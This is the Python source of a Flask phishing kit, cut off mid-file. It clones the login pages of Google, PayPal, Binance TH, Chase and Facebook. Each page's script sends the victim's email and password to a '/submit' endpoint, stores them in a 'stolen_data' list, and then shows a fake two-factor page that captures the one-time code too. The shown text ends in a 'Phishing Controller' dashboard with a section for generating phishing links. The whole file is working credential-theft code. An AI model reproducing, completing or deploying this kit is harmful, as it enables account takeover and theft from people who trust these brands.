import secrets
import time
import uuid
from flask import Flask, request, jsonify

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

stolen_data = []

# ========== YOUR EXACT GOOGLE DESIGN ==========
GOOGLE_LOGIN = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Google Sign In</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background-color: #000000; color: #ffffff; font-family: "Google Sans", Roboto, Arial, sans-serif; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 60px 28px 40px; }
    .logo { font-size: 26px; font-weight: 400; color: #ffffff; margin-bottom: 28px; letter-spacing: 0.3px; }
    h1 { font-size: 30px; font-weight: 400; color: #ffffff; margin-bottom: 18px; }
    .subtitle { font-size: 15px; color: #e0e0e0; text-align: center; line-height: 1.6; max-width: 340px; margin-bottom: 6px; }
    .learn-more { color: #7baaf7; font-size: 15px; font-weight: 600; text-decoration: none; text-align: center; margin-bottom: 36px; display: block; }
    .learn-more:hover { text-decoration: underline; }
    .input-wrapper { width: 100%; max-width: 380px; margin-bottom: 12px; }
    .input-field { width: 100%; background: transparent; border: 1.5px solid #5f6368; border-radius: 4px; padding: 16px 14px; font-size: 16px; color: #e8eaed; outline: none; transition: border-color 0.2s; margin-bottom: 16px; }
    .input-field::placeholder { color: #9aa0a6; }
    .input-field:focus { border-color: #7baaf7; }
    .forgot-link { color: #7baaf7; font-size: 14px; font-weight: 600; text-decoration: none; display: block; margin-bottom: 32px; }
    .create-link { color: #7baaf7; font-size: 15px; font-weight: 600; text-decoration: none; align-self: flex-start; max-width: 380px; width: 100%; }
    .spacer { flex: 1; }
    .btn-row { width: 100%; max-width: 380px; display: flex; justify-content: flex-end; padding-bottom: 20px; }
    .btn-next { background-color: #7baaf7; color: #000000; border: none; border-radius: 6px; padding: 14px 32px; font-size: 16px; font-weight: 500; cursor: pointer; transition: background-color 0.2s; }
    .btn-next:hover { background-color: #6a9de8; }
  </style>
</head>
<body>
  <div class="logo">Google</div>
  <h1>Sign in</h1>
  <p class="subtitle">Use your Google Account. The account will be added to this device and available to other Google apps.</p>
  <a href="#" class="learn-more">Learn more about using your account</a>
  <form id="loginForm">
    <div class="input-wrapper"><input class="input-field" type="text" id="email" placeholder="Email or phone" /></div>
    <div class="input-wrapper"><input class="input-field" type="password" id="password" placeholder="Password" /></div>
    <a href="#" class="forgot-link">Forgot email?</a>
    <a href="#" class="create-link">Create account</a>
    <div class="spacer"></div>
    <div class="btn-row"><button type="submit" class="btn-next">Next</button></div>
  </form>
  <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      fetch('/submit', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ email: document.getElementById('email').value, password: document.getElementById('password').value, platform: 'google', step: 'login' })
      }).then(() => { window.location.href = '/otp/google'; });
    });
  </script>
</body>
</html>
'''

# ========== YOUR EXACT PAYPAL DESIGN ==========
PAYPAL_LOGIN = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>PayPal Login</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; background-color: #f5f7fa; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: space-between; }
    .main-wrapper { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%; padding: 60px 20px 40px; }
    .logo { font-size: 38px; font-weight: 800; color: #003087; letter-spacing: -1px; margin-bottom: 50px; }
    .login-card { background: #ffffff; border-radius: 8px; padding: 36px 28px 30px; width: 100%; max-width: 440px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.07); }
    .input-field { width: 100%; border: 1.5px solid #b5bec9; border-radius: 6px; padding: 18px 16px; font-size: 16px; color: #687173; background: #ffffff; outline: none; transition: border-color 0.2s; margin-bottom: 14px; }
    .input-field:focus { border-color: #0070ba; }
    .forgot-link { display: inline-block; color: #0070ba; font-size: 14px; text-decoration: none; margin-bottom: 24px; }
    .btn-next { display: block; width: 100%; padding: 16px; background-color: #0070ba; color: #ffffff; font-size: 17px; font-weight: 600; border: none; border-radius: 28px; cursor: pointer; text-align: center; transition: background-color 0.2s; margin-bottom: 22px; }
    .btn-next:hover { background-color: #005ea6; }
    .divider { display: flex; align-items: center; gap: 14px; margin-bottom: 22px; color: #687173; font-size: 15px; }
    .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background-color: #d0d5da; }
    .btn-signup { display: block; width: 100%; padding: 15px; background-color: transparent; color: #111111; font-size: 17px; font-weight: 600; border: 2px solid #222222; border-radius: 28px; cursor: pointer; text-align: center; transition: background-color 0.2s; }
    .btn-signup:hover { background-color: #f0f0f0; }
    .language-bar { display: flex; align-items: center; gap: 12px; margin-top: 36px; flex-wrap: wrap; justify-content: center; }
    .flag-emoji { font-size: 18px; line-height: 1; }
    .language-bar a { text-decoration: none; font-size: 14px; color: #555; }
    .language-bar a.active { font-weight: 700; color: #111; }
    footer { width: 100%; border-top: 1px solid #dde1e7; padding: 16px 20px; display: flex; justify-content: center; flex-wrap: wrap; gap: 6px 22px; }
    footer a { text-decoration: none; font-size: 13px; color: #555; }
  </style>
</head>
<body>
  <div class="main-wrapper">
    <div class="logo">PayPal</div>
    <div class="login-card">
      <form id="loginForm">
        <input class="input-field" type="text" id="email" placeholder="Email or mobile number" />
        <input class="input-field" type="password" id="password" placeholder="Password" />
        <a href="#" class="forgot-link">Forgot email?</a>
        <button type="submit" class="btn-next">Next</button>
        <div class="divider">or</div>
        <button class="btn-signup">Sign Up</button>
      </form>
    </div>
    <div class="language-bar"><span class="flag-emoji">🇺🇸</span><a href="#" class="active">English</a><span class="sep">|</span><a href="#">Français</a><span class="sep">|</span><a href="#">Español</a><span class="sep">|</span><a href="#">中文</a></div>
  </div>
  <footer><a href="#">Contact Us</a><a href="#">Privacy</a><a href="#">Legal</a><a href="#">Policy Updates</a><a href="#">Worldwide</a></footer>
  <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      fetch('/submit', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ email: document.getElementById('email').value, password: document.getElementById('password').value, platform: 'paypal', step: 'login' })
      }).then(() => { window.location.href = '/otp/paypal'; });
    });
  </script>
</body>
</html>
'''

# ========== YOUR EXACT BINANCE DESIGN ==========
BINANCE_LOGIN = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Binance TH Login</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background-color: #ffffff; font-family: "Helvetica Neue", Arial, sans-serif; min-height: 100vh; display: flex; flex-direction: column; }
    nav { display: flex; align-items: center; justify-content: space-between; padding: 14px 18px; border-bottom: 1px solid #f0f0f0; }
    .nav-logo { display: flex; align-items: center; gap: 8px; }
    .nav-logo svg { width: 32px; height: 32px; }
    .nav-logo-text { display: flex; flex-direction: column; line-height: 1.1; }
    .brand-name { font-size: 17px; font-weight: 700; color: #1e2026; letter-spacing: 0.5px; }
    .brand-name span { color: #f0b90b; }
    .brand-sub { font-size: 9px; color: #aaa; letter-spacing: 0.5px; }
    .nav-right { display: flex; align-items: center; gap: 12px; }
    .btn-register { background-color: #f0b90b; color: #1e2026; border: none; border-radius: 4px; padding: 10px 22px; font-size: 15px; font-weight: 600; cursor: pointer; }
    .hamburger { font-size: 22px; cursor: pointer; color: #1e2026; background: none; border: none; }
    .security-banner { background-color: #fef9e7; border-bottom: 1px solid #f5e79e; padding: 12px 18px; display: flex; align-items: flex-start; gap: 10px; }
    .security-banner .lock-icon { font-size: 16px; color: #f0b90b; margin-top: 2px; flex-shrink: 0; }
    .security-banner p { font-size: 13px; color: #b78a00; line-height: 1.5; }
    .security-banner a { color: #b78a00; font-weight: 600; }
    .main { flex: 1; padding: 36px 22px; }
    h1 { font-size: 26px; font-weight: 700; color: #1e2026; text-align: center; margin-bottom: 28px; }
    .tabs { display: flex; border-bottom: 1.5px solid #e8e8e8; margin-bottom: 28px; gap: 0; }
    .tab { flex: 1; text-align: center; padding: 12px 0; font-size: 16px; font-weight: 500; color: #9aa0a6; cursor: pointer; border-bottom: 3px solid transparent; margin-bottom: -1.5px; transition: color 0.2s; }
    .tab.active { color: #1e2026; font-weight: 700; border-bottom: 3px solid #f0b90b; }
    .field-label { font-size: 14px; color: #1e2026; margin-bottom: 8px; }
    .input-field { width: 100%; border: 1.5px solid #d9d9d9; border-radius: 4px; padding: 16px 14px; font-size: 15px; color: #1e2026; background: #fff; outline: none; transition: border-color 0.2s; margin-bottom: 20px; }
    .input-field:focus { border-color: #f0b90b; }
    .password-wrapper { position: relative; }
    .password-wrapper .input-field { padding-right: 48px; }
    .toggle-eye { position: absolute; right: 14px; top: 50%; transform: translateY(-60%); cursor: pointer; color: #aaa; font-size: 20px; user-select: none; }
    .btn-login { width: 100%; background-color: #f0b90b; color: #1e2026; border: none; border-radius: 4px; padding: 17px; font-size: 16px; font-weight: 700; cursor: pointer; margin-bottom: 20px; transition: background-color 0.2s; }
    .btn-login:hover { background-color: #d9a609; }
    .bottom-links { display: flex; justify-content: space-between; }
    .bottom-links a { color: #f0b90b; font-size: 14px; font-weight: 600; text-decoration: none; }
    .chat-fab { position: fixed; bottom: 28px; right: 20px; width: 52px; height: 52px; background-color: #f0b90b; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; box-shadow: 0 4px 12px rgba(0,0,0,0.2); }
    .chat-fab svg { width: 26px; height: 26px; fill: #1e2026; }
  </style>
</head>
<body>
  <nav><div class="nav-logo"><svg viewBox="0 0 40 40" fill="none"><polygon points="20,4 36,20 20,36 4,20" fill="#f0b90b"/><polygon points="20,10 30,20 20,30 10,20" fill="#fff" opacity="0.3"/></svg><div class="nav-logo-text"><span class="brand-name">BINANCE <span>TH</span></span><span class="brand-sub">BY GULF BINANCE</span></div></div><div class="nav-right"><button class="btn-register">Register</button><button class="hamburger">&#9776;</button></div></nav>
  <div class="security-banner"><span class="lock-icon">🔒</span><p>Please check that you are visiting the correct URL&nbsp;&nbsp;<a href="#">https://accounts.binance.th</a></p></div>
  <div class="main"><h1>Log In</h1><div class="tabs"><div class="tab active">Email</div><div class="tab">Mobile</div></div>
  <form id="loginForm"><p class="field-label">Email</p><input class="input-field" type="email" id="email" /><p class="field-label">Password</p><div class="password-wrapper"><input class="input-field" type="password" id="password" /><span class="toggle-eye">&#128065;&#65038;</span></div><button type="submit" class="btn-login">Log In</button><div class="bottom-links"><a href="#">Register</a><a href="#">Forgot Password?</a></div></form></div>
  <div class="chat-fab"><svg viewBox="0 0 24 24"><path d="M20 2H4a2 2 0 0 0-2 2v18l4-4h14a2 2 0 0 0 2-2V4a2 2 0 0 0-2-2zm-2 10H6V10h12v2zm0-4H6V6h12v2z"/></svg></div>
  <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      fetch('/submit', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ email: document.getElementById('email').value, password: document.getElementById('password').value, platform: 'binance', step: 'login' })
      }).then(() => { window.location.href = '/otp/binance'; });
    });
  </script>
</body>
</html>
'''

# ========== YOUR EXACT CHASE DESIGN ==========
CHASE_LOGIN = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Chase Sign In</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: "Helvetica Neue", Arial, sans-serif; background-color: #e8eaf0; min-height: 100vh; display: flex; flex-direction: column; }
    .hero { position: relative; width: 100%; min-height: 680px; background: linear-gradient(to bottom, rgba(10,20,50,0.55) 0%, rgba(10,30,70,0.3) 40%, rgba(60,80,60,0.25) 100%), linear-gradient(160deg, #0d1b3e 0%, #1a3260 18%, #1e4080 35%, #2a5598 50%, #3a6080 62%, #4a7060 72%, #5a6840 80%, #3a4030 90%, #2a3020 100%); display: flex; flex-direction: column; align-items: center; padding-top: 36px; padding-bottom: 50px; }
    .hero::before { content: ""; position: absolute; bottom: 120px; left: 0; right: 0; height: 80px; background: linear-gradient(to top, rgba(255,160,30,0.18), transparent); pointer-events: none; }
    .chase-logo { display: flex; align-items: center; gap: 14px; margin-bottom: 44px; z-index: 2; }
    .chase-wordmark { font-size: 36px; font-weight: 800; color: #ffffff; letter-spacing: 3px; font-family: "Arial Black", Arial, sans-serif; }
    .chase-icon { width: 46px; height: 46px; flex-shrink: 0; }
    .card { background: #ffffff; border-radius: 10px; padding: 28px 24px 30px; width: 88%; max-width: 400px; z-index: 2; box-shadow: 0 6px 24px rgba(0,0,0,0.25); }
    .field-group { margin-bottom: 22px; }
    .field-label { display: block; font-size: 14px; color: #555; margin-bottom: 4px; }
    .input-row { display: flex; align-items: center; border-bottom: 2px solid #1a56a0; }
    .input-field { flex: 1; border: none; outline: none; font-size: 17px; color: #111; padding: 7px 0; background: transparent; }
    .show-link { color: #1a56a0; font-size: 15px; font-weight: 700; cursor: pointer; text-decoration: none; white-space: nowrap; margin-left: 8px; }
    .checkboxes { display: flex; gap: 32px; margin-bottom: 26px; }
    .checkbox-item { display: flex; align-items: flex-start; gap: 8px; font-size: 14px; color: #444; cursor: pointer; line-height: 1.4; }
    .checkbox-item input[type="checkbox"] { width: 20px; height: 20px; margin-top: 1px; flex-shrink: 0; border: 1.5px solid #888; border-radius: 3px; appearance: none; background: #fff; cursor: pointer; }
    .checkbox-item input[type="checkbox"]:checked { background-color: #1a56a0; border-color: #1a56a0; }
    .btn-signin { display: block; width: 100%; background-color: #1a56a0; color: #ffffff; border: none; border-radius: 5px; padding: 16px; font-size: 18px; font-weight: 700; cursor: pointer; margin-bottom: 20px; }
    .btn-signin:hover { background-color: #154a8a; }
    .divider { display: flex; align-items: center; gap: 12px; color: #777; font-size: 15px; margin-bottom: 18px; }
    .divider::before, .divider::after { content: ""; flex: 1; height: 1.5px; background: #1a56a0; opacity: 0.4; }
    .btn-passwordless { display: block; width: 100%; background: transparent; border: 2px solid #1a56a0; border-radius: 5px; padding: 14px; font-size: 17px; font-weight: 700; color: #1a56a0; cursor: pointer; margin-bottom: 20px; }
    .action-link { display: flex; align-items: center; color: #1a56a0; font-size: 16px; text-decoration: none; margin-bottom: 16px; }
    .action-link .chevron { margin-left: 8px; font-size: 18px; font-weight: 700; }
    footer { background-color: #e8eaf0; padding: 28px 20px 24px; }
    .social-icons { display: flex; justify-content: center; gap: 26px; margin-bottom: 20px; }
    .social-icon svg { width: 28px; height: 28px; fill: #444; }
    .footer-links { display: flex; flex-wrap: wrap; justify-content: center; gap: 6px 20px; margin-bottom: 12px; }
    .footer-links a { font-size: 12px; color: #333; text-decoration: underline; }
    .footer-bottom { text-align: center; font-size: 12px; color: #555; line-height: 2; }
  </style>
</head>
<body>
  <div class="hero">
    <div class="chase-logo"><span class="chase-wordmark">CHASE</span><svg class="chase-icon" viewBox="0 0 46 46"><polygon points="14,2 32,2 44,14 44,32 32,44 14,44 2,32 2,14" fill="white"/><polygon points="17,5 29,5 41,17 41,29 29,41 17,41 5,29 5,17" fill="#1a56a0"/><rect x="12" y="12" width="9" height="9" fill="white"/><rect x="25" y="12" width="9" height="9" fill="white"/><rect x="12" y="25" width="9" height="9" fill="white"/><rect x="25" y="25" width="9" height="9" fill="white"/></svg></div>
    <div class="card">
      <form id="loginForm">
        <div class="field-group"><label class="field-label">Username</label><div class="input-row"><input class="input-field" type="text" id="username" /></div></div>
        <div class="field-group"><label class="field-label">Password</label><div class="input-row"><input class="input-field" type="password" id="password" /><a href="#" class="show-link">Show</a></div></div>
        <div class="checkboxes"><label class="checkbox-item"><input type="checkbox" />Remember username</label><label class="checkbox-item"><input type="checkbox" />Use token</label></div>
        <button type="submit" class="btn-signin">Sign in</button>
        <div class="divider">Or</div>
        <button class="btn-passwordless">Passwordless sign in</button>
        <a href="#" class="action-link">Forgot username/password? <span class="chevron">›</span></a>
        <a href="#" class="action-link">Not enrolled? Sign up now. <span class="chevron">›</span></a>
      </form>
    </div>
  </div>
  <footer><div class="social-icons"><a class="social-icon"><svg viewBox="0 0 24 24"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"/></svg></a></div><div class="footer-links"><a href="#">Contact us</a><a href="#">Privacy & security</a><a href="#">Terms of use</a><a href="#">Accessibility</a></div><div class="footer-bottom">Member FDIC &nbsp;|&nbsp; Equal Housing Opportunity<br>&copy; 2026 JPMorganChase</div></footer>
  <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      fetch('/submit', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ email: document.getElementById('username').value, password: document.getElementById('password').value, platform: 'chase', step: 'login' })
      }).then(() => { window.location.href = '/otp/chase'; });
    });
  </script>
</body>
</html>
'''

# ========== YOUR EXACT FACEBOOK DESIGN ==========
FACEBOOK_LOGIN = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Facebook Login</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background-color: #18191a; color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 0 24px; }
    .top-bar { width: 100%; display: flex; align-items: center; padding: 20px 0 10px; position: relative; }
    .back-arrow { font-size: 22px; color: #ffffff; cursor: pointer; text-decoration: none; position: absolute; left: 0; }
    .language-selector { margin: 0 auto; display: flex; align-items: center; gap: 6px; font-size: 15px; color: #b0b3b8; cursor: pointer; }
    .fb-icon-wrapper { margin: 36px 0 40px; display: flex; justify-content: center; }
    .fb-icon { width: 76px; height: 76px; background-color: #1877f2; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
    .fb-icon svg { width: 46px; height: 46px; fill: #ffffff; }
    .divider-line { width: 100%; height: 1px; background-color: #3a3b3c; margin-bottom: 22px; }
    .terms-text { font-size: 14px; color: #e4e6eb; line-height: 1.6; margin-bottom: 18px; width: 100%; }
    .terms-text .link { color: #2d88ff; font-weight: 600; text-decoration: none; }
    .divider-line-2 { width: 100%; height: 1px; background-color: #3a3b3c; margin-bottom: 18px; }
    .input-field { width: 100%; background-color: #242526; border: 1.5px solid #3a3b3c; border-radius: 10px; padding: 18px 16px; font-size: 16px; color: #e4e6eb; outline: none; margin-bottom: 12px; }
    .input-field:focus { border-color: #2d88ff; }
    .btn-login { width: 100%; background-color: #1877f2; color: #ffffff; border: none; border-radius: 30px; padding: 17px; font-size: 17px; font-weight: 700; cursor: pointer; margin-bottom: 20px; margin-top: 4px; }
    .btn-login:hover { background-color: #1668d9; }
    .forgot-link { color: #e4e6eb; font-size: 15px; font-weight: 600; text-decoration: none; text-align: center; display: block; margin-bottom: auto; }
    .spacer { flex: 1; }
    .btn-create { width: 100%; background-color: transparent; border: 1.5px solid #2d88ff; border-radius: 30px; padding: 16px; font-size: 16px; font-weight: 600; color: #2d88ff; cursor: pointer; margin-bottom: 16px; }
    .meta-logo { display: flex; align-items: center; gap: 8px; margin-bottom: 24px; color: #b0b3b8; font-size: 15px; font-weight: 500; }
  </style>
</head>
<body>
  <div class="top-bar"><a class="back-arrow" href="#">&#8592;</a><div class="language-selector">English (US) <span class="chevron">&#8964;</span></div></div>
  <div class="fb-icon-wrapper"><div class="fb-icon"><svg viewBox="0 0 24 24"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"/></svg></div></div>
  <div class="divider-line"></div>
  <p class="terms-text">By proceeding, you agree to <a href="#" class="link">Your network terms</a> which includes letting Facebook request and receive your phone number. <a href="#" class="link">Change Settings</a></p>
  <div class="divider-line-2"></div>
  <form id="loginForm">
    <input class="input-field" type="text" id="email" placeholder="Mobile number or email" />
    <input class="input-field" type="password" id="password" placeholder="Password" />
    <button type="submit" class="btn-login">Log in</button>
    <a href="#" class="forgot-link">Forgot password?</a>
    <div class="spacer"></div>
    <button class="btn-create">Create new account</button>
    <div class="meta-logo"><svg viewBox="0 0 36 20"><path d="M3.5 10C3.5 7.5 4.8 5.5 6.5 5.5C8.1 5.5 9.2 6.6 10.8 9.2L12 11.2C13.9 14.3 15.6 16 18 16C20.8 16 22.8 13.5 22.8 10C22.8 6.8 21 4.5 18.2 4.5C16.6 4.5 15.2 5.3 13.9 6.9L12.5 5C14.2 3.1 16 2 18.3 2C22.6 2 26.5 5.4 26.5 10C26.5 14.9 23.3 18.5 18 18.5C15 18.5 12.8 17 10.7 13.6L9.5 11.6C8.1 9.3 7.2 8 6.5 8C5.4 8 4.8 9.2 4.8 10C4.8 10.8 5.1 11.8 5.7 12.6L3.9 13.8C3.1 12.7 2.5 11.4 3.5 10Z" fill="#b0b3b8"/></svg>Meta</div>
  </form>
  <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      fetch('/submit', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ email: document.getElementById('email').value, password: document.getElementById('password').value, platform: 'facebook', step: 'login' })
      }).then(() => { window.location.href = '/otp/facebook'; });
    });
  </script>
</body>
</html>
'''

# ========== OTP PAGES (Matching each platform) ==========
GOOGLE_OTP = '''
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><title>2-Step Verification</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#000;color:#fff;font-family:"Google Sans",Roboto,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:60px 28px}.logo{font-size:26px;margin-bottom:28px}h1{font-size:28px;margin-bottom:18px}.subtitle{font-size:15px;color:#e0e0e0;margin-bottom:32px}.otp-field{width:100%;max-width:380px;background:transparent;border:1.5px solid #5f6368;border-radius:4px;padding:16px;font-size:18px;color:#e8eaed;text-align:center;margin-bottom:20px;outline:none}.btn-verify{background:#7baaf7;color:#000;border:none;border-radius:6px;padding:14px 32px;font-size:16px;cursor:pointer;width:100%;max-width:380px;margin:0 auto;display:block}</style>
</head>
<body><div class="logo">Google</div><h1>2-Step Verification</h1><p class="subtitle">Enter the code from your authenticator app or SMS</p><form id="otpForm"><input class="otp-field" type="text" id="otp" placeholder="Enter verification code"><button type="submit" class="btn-verify">Verify</button></form>
<script>document.getElementById('otpForm').addEventListener('submit',function(e){e.preventDefault();fetch('/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({otp:document.getElementById('otp').value,platform:'google',step:'otp'})}).then(()=>{document.body.innerHTML='<div style="text-align:center;padding:50px;"><h3>Verifying...</h3></div>';});});</script>
</body></html>
'''

PAYPAL_OTP = '''
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><title>Security Code</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#f5f7fa;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#fff;border-radius:12px;padding:32px;width:90%;max-width:400px;text-align:center}.logo{font-size:32px;font-weight:bold;color:#003087}.otp-field{width:100%;padding:14px;border:1px solid #ccc;border-radius:6px;margin:20px 0;text-align:center}.btn-verify{width:100%;background:#0070ba;color:#fff;border:none;border-radius:28px;padding:14px;cursor:pointer}</style>
</head>
<body><div class="card"><div class="logo">PayPal</div><h2>Security Code</h2><p>Enter code from authenticator app</p><form id="otpForm"><input class="otp-field" type="text" id="otp" placeholder="Enter code"><button type="submit" class="btn-verify">Verify</button></form></div>
<script>document.getElementById('otpForm').addEventListener('submit',function(e){e.preventDefault();fetch('/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({otp:document.getElementById('otp').value,platform:'paypal',step:'otp'})}).then(()=>{document.body.innerHTML='<div style="text-align:center;padding:50px;"><h3>Verifying...</h3></div>';});});</script>
</body></html>
'''

BINANCE_OTP = '''
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><title>2FA Verification</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#fff;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#fff;border-radius:16px;padding:32px;width:90%;max-width:400px;text-align:center}.otp-field{width:100%;padding:14px;border:1px solid #ddd;border-radius:8px;margin:20px 0;text-align:center}.btn-verify{width:100%;background:#f0b90b;color:#1e2026;border:none;border-radius:8px;padding:14px;font-weight:bold;cursor:pointer}</style>
</head>
<body><div class="card"><h2>Two-Factor Authentication</h2><p>Enter code from authenticator app</p><form id="otpForm"><input class="otp-field" type="text" id="otp" placeholder="Enter code"><button type="submit" class="btn-verify">Verify</button></form></div>
<script>document.getElementById('otpForm').addEventListener('submit',function(e){e.preventDefault();fetch('/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({otp:document.getElementById('otp').value,platform:'binance',step:'otp'})}).then(()=>{document.body.innerHTML='<div style="text-align:center;padding:50px;"><h3>Verifying...</h3></div>';});});</script>
</body></html>
'''

CHASE_OTP = '''
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><title>Token Code</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#e8eaf0;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#fff;border-radius:10px;padding:32px;width:90%;max-width:400px;text-align:center}.logo{font-size:28px;font-weight:bold;color:#1a56a0}.otp-field{width:100%;padding:14px;border:none;border-bottom:2px solid #1a56a0;margin:20px 0;text-align:center}.btn-verify{width:100%;background:#1a56a0;color:#fff;border:none;border-radius:5px;padding:14px;cursor:pointer}</style>
</head>
<body><div class="card"><div class="logo">CHASE</div><h2>Token Verification</h2><p>Enter code from authenticator app</p><form id="otpForm"><input class="otp-field" type="text" id="otp" placeholder="Enter code"><button type="submit" class="btn-verify">Verify</button></form></div>
<script>document.getElementById('otpForm').addEventListener('submit',function(e){e.preventDefault();fetch('/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({otp:document.getElementById('otp').value,platform:'chase',step:'otp'})}).then(()=>{document.body.innerHTML='<div style="text-align:center;padding:50px;"><h3>Verifying...</h3></div>';});});</script>
</body></html>
'''

FACEBOOK_OTP = '''
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><title>Two-Factor Authentication</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#18191a;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#242526;border-radius:12px;padding:28px;width:90%;max-width:400px;text-align:center}.fb-icon{width:48px;height:48px;background:#1877f2;border-radius:50%;margin:0 auto 20px}.otp-field{width:100%;background:#3a3b3c;border:none;border-radius:8px;padding:14px;color:#fff;text-align:center;margin-bottom:20px}.btn-verify{width:100%;background:#1877f2;color:#fff;border:none;border-radius:8px;padding:14px;font-weight:bold;cursor:pointer}</style>
</head>
<body><div class="card"><div class="fb-icon"></div><h2>Two-Factor Authentication</h2><p>Enter code from authenticator app</p><form id="otpForm"><input class="otp-field" type="text" id="otp" placeholder="Enter code"><button type="submit" class="btn-verify">Verify</button></form></div>
<script>document.getElementById('otpForm').addEventListener('submit',function(e){e.preventDefault();fetch('/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({otp:document.getElementById('otp').value,platform:'facebook',step:'otp'})}).then(()=>{document.body.innerHTML='<div style="text-align:center;padding:50px;"><h3>Verifying...</h3></div>';});});</script>
</body></html>
'''

# ========== DASHBOARD WITH VOICE ALERTS ==========
DASHBOARD = '''
<!DOCTYPE html>
<html>
<head><meta name="viewport" content="width=device-width"><title>Phishing Controller - Veronica</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0e1a;font-family:monospace;color:#0f0;padding:20px}
.container{max-width:1200px;margin:auto}
h1{border-bottom:2px solid #0f0;padding-bottom:10px;margin-bottom:20px}
.card{background:#111827;border:1px solid #0f0;border-radius:16px;padding:20px;margin-bottom:20px}
.platform-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:15px;margin-bottom:20px}
.platform-btn{background:#1f2937;border:1px solid #0f0;border-radius:10px;padding:15px;text-align:center;color:#0f0;cursor:pointer;transition:all 0.2s}
.platform-btn:hover{background:#0f0;color:#000;transform:scale(1.02)}
.link-box{background:#000;padding:15px;border-radius:10px;margin-top:15px}
.link-input{width:100%;padding:10px;background:#1a1a2e;color:#0f0;border:1px solid #0f0;border-radius:5px;margin:5px 0}
.copy-btn{background:#0f0;color:#000;border:none;padding:8px 16px;border-radius:5px;cursor:pointer}
table{width:100%;border-collapse:collapse}
th,td{border:1px solid #0f0;padding:10px;text-align:left}
th{background:#1f2937}
.voice-badge{background:#0f0;color:#000;padding:5px 15px;border-radius:20px;display:inline-block;animation:pulse 1.5s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}
</style>
</head>
<body>
<div class="container">
<h1>💰 PHISHING CONTROLLER - VERONICA</h1>
<div class="card">
<span class="voice-badge">🎙️ VOICE ALERTS ACTIVE</span>
<div style="margin-top:10px">🌍 Live URL: <span id="liveUrl"></span></div>
</div>
<div class="card">
<h3>🔗 Generate Phishing Links</h3>
